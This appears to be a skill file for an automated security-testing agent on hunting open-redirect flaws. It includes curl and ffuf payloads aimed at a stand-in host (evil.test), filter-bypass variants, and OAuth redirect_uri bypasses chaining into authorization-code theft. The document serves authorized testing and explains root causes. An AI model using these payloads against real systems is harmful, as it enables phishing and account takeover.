---
name: hunt-open-redirect
description: >
  Hunt for open redirect: parameter-based redirects, header-based redirects (Location
  injection), and meta-refresh/JS-based redirect sinks. Use when a URL/param controls
  post-action navigation — `?next=`, `?returnUrl=`, `?redirect=`, OAuth `redirect_uri`,
  logout/SSO landing pages, "continue to" links.
  Keywords: open redirect, unvalidated redirect, redirect_uri, returnUrl, next param,
  location header injection, meta refresh, javascript window.location, oauth redirect_uri
  bypass, phishing pivot.
  Do NOT use for redirects that are purely internal/relative-path-only with no way to point
  off-domain (not exploitable — note as N/A). Do NOT use for SSRF where the *server* follows
  the redirect — that's hunt-ssrf; this skill is about the *victim's browser* being redirected.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-601]
  mitre_attack: [T1204]
  tools: [curl, ffuf, burp]
depends_on: [active-recon, web-crawling, param-discovery]
feeds_into: [chain-analysis, phishing-pivot]
chains_with: [auth-bypass, xss, csrf]
---

## Signals

- Params named `next`, `redirect`, `redirect_uri`, `return`, `returnUrl`, `continue`, `url`,
  `dest`, `target`, `goto`, `callback` on login/logout flows, OAuth/SSO, link-tracking/
  email-click endpoints.
- OAuth 2.0/OIDC flows where `redirect_uri` validation seems loose (accepts any URI under a
  registered domain rather than exact match, or doesn't validate at all).
- `Location` header in a 3xx response built from user input.
- Client-side redirects: `window.location = getParam('next')`, meta-refresh tags with a
  dynamic URL.
- Link-shortener or "you are leaving this site" interstitial features.

## Prerequisites

- An identified redirect-controlling parameter or OAuth flow.
- For OAuth-specific testing: the app's registered `redirect_uri` value(s) to compare against,
  and an understanding of exact-match vs. prefix-match vs. no-match validation behavior.

## Methodology

1. **Baseline and direct absolute-URL test:**
   ```bash
   curl -sI "https://target/login?next=/dashboard"              # baseline relative, expected
   curl -sI "https://target/login?next=https://evil.test"        # absolute external
   curl -sI "https://target/login?next=//evil.test"               # protocol-relative
   curl -sI "https://target/login?next=https:evil.test"           # missing-slash variant
   ```
   Check the `Location` header of the resulting redirect response (or final destination if
   curl follows with `-L`) for `evil.test`.

2. **Filter/validation bypass variants** when a naive check blocks plain `https://evil.test`
   (common checks: "starts with `http`", "contains target domain somewhere"):
   ```bash
   curl -sI "https://target/login?next=https://target.com@evil.test"      # userinfo trick
   curl -sI "https://target/login?next=https://evil.test/target.com"      # path trick
   curl -sI "https://target/login?next=https://evil.target.com"           # subdomain-confusion
   curl -sI "https://target/login?next=https://target.com.evil.test"      # domain-confusion
   curl -sI "https://target/login?next=/%2F%2Fevil.test"                  # encoded double-slash
   curl -sI "https://target/login?next=/\\evil.test"                      # backslash (browser
                                                                           #   treats as //)
   curl -sI "https://target/login?next=https:/evil.test"                 # single slash
   curl -sI "https://target/login?next=%09https://evil.test"             # tab-char smuggle
   ```

3. **Header-based (Location injection) check** when the redirect target is built from a header
   value (e.g., `Referer`, a custom header) rather than a query param:
   ```bash
   curl -sI "https://target/logout" -H "Referer: https://evil.test"
   ```

4. **Meta-refresh / JS-sink confirmation** — static analysis of client JS plus a real-browser
   check, since curl won't execute JS redirects:
   ```bash
   curl -s https://target/app.js | grep -nE "window\.location|location\.href|location\.replace|meta.*refresh"
   ```
   Then manually load `https://target/page?next=https://evil.test` in a browser and confirm
   actual navigation occurs (address bar changes to evil.test).

5. **OAuth `redirect_uri` validation bypass** — the highest-impact open-redirect variant, since
   it can leak authorization codes/tokens to an attacker domain:
   ```bash
   # exact-registered value, baseline
   curl -s "https://target/oauth/authorize?client_id=CID&redirect_uri=https://target/callback&response_type=code"

   # prefix/path-append bypass
   curl -s "https://target/oauth/authorize?client_id=CID&redirect_uri=https://target/callback/../evil&response_type=code"
   curl -s "https://target/oauth/authorize?client_id=CID&redirect_uri=https://target/callback.evil.test&response_type=code"
   curl -s "https://target/oauth/authorize?client_id=CID&redirect_uri=https://target/callback%2F@evil.test&response_type=code"

   # open redirect endpoint ON the trusted domain used AS the redirect_uri (chains an
   # already-found open redirect into OAuth token theft)
   curl -s "https://target/oauth/authorize?client_id=CID&redirect_uri=https://target/login?next=https://evil.test&response_type=code"
   ```
   If step confirms the authorization flow completes and the code/token lands on `evil.test`
   (via the chained open-redirect page), this is a critical-severity finding — document the
   full redirect chain.

6. **Automated sweep across many params/paths:**
   ```bash
   ffuf -w redirect_params.txt -u "https://target/login?FUZZ=https://evil.test" \
     -mr "evil\.test" -o redirect_sweep.json -of json
   nuclei -l urls.txt -tags redirect -o nuclei_redirect.txt
   ```

## Tooling

- `curl -I`/`-L` — primary manual technique; always inspect the `Location` header directly
  rather than relying on curl's auto-follow, to see exactly what the server sent.
- Browser devtools — required for JS/meta-refresh-sink confirmation.
- `ffuf`/`nuclei -tags redirect` — breadth sweep.
- Burp Suite — intercept and modify the actual OAuth flow for the `redirect_uri` bypass testing.

## Root Causes

- Redirect target taken directly from user input with no allowlist of permitted destinations
  or paths.
- Validation implemented as a blocklist/substring check (`if not url.startswith("http")`,
  `if "evil" not in url`) instead of parsing the URL and checking the actual host against an
  allowlist.
- OAuth/OIDC `redirect_uri` validated via prefix/substring match instead of the spec-required
  exact string match against the registered value.

## Validation Gate (minimum proof)

- A request to the redirect-controlling parameter/flow results in an actual `Location` header
  (or confirmed browser navigation for JS-based sinks) pointing to a domain you control, fully
  outside the target's domain — captured request + response.
- For OAuth: the full authorization flow completed end-to-end with the authorization
  code/token actually arriving at the attacker-controlled endpoint — not just a validation
  error bypassed partway through.

## Gotchas

- **Minimum proof, not a live phishing campaign.** Point the PoC at a benign test page you
  control (a simple "redirect confirmed" page); don't build or send actual phishing content as
  part of this proof.
- **Common N/A:** redirect target is validated against a real allowlist and only ever resolves
  to relative/same-origin paths, with no bypass found after testing the variants in step 2 —
  legitimate N/A, don't report "the app has a `next` param" as a finding without a working
  bypass.
- **Common N/A:** the app does redirect to an arbitrary URL, but only after an interstitial
  warning page the user must explicitly click through ("You are leaving target.com") — this
  significantly reduces real-world risk; note it as a mitigating factor affecting severity, not
  as making it a non-finding (the underlying lack of validation is still real).
- **Overclaim trap:** a `3xx` response with a `Location` header pointing to your test domain is
  solid proof; a `200` response that merely *contains the string* `evil.test` somewhere in the
  body (e.g., in an error message echoing the param) is not redirect proof — confirm an actual
  navigation/redirect occurs.
- **Overclaim trap:** OAuth `redirect_uri` bypass findings are only as severe as what actually
  reaches the attacker domain — confirm whether it's the authorization *code* (serious, often
  exchangeable for a token) or just a harmless post-login landing page (lower severity); state
  which explicitly.
- Browser-specific parsing differences matter here (backslash-as-slash normalization varies by
  browser) — note which browser confirmed the bypass if it's browser-dependent.

## Chains & Compositions

- Open redirect → OAuth token/code theft → **auth-bypass**/account takeover (the highest-impact
  chain for this class — always check whether an open redirect sits inside or near an OAuth
  flow).
- Open redirect used to add legitimacy to a phishing link (makes a malicious URL start with the
  trusted domain) — report as a distinct lower-but-real risk even without a technical token-
  theft chain.
- Open redirect + reflected **xss** on the redirect landing page compounds into a more
  convincing attack chain — note the combination if both exist on the same flow.
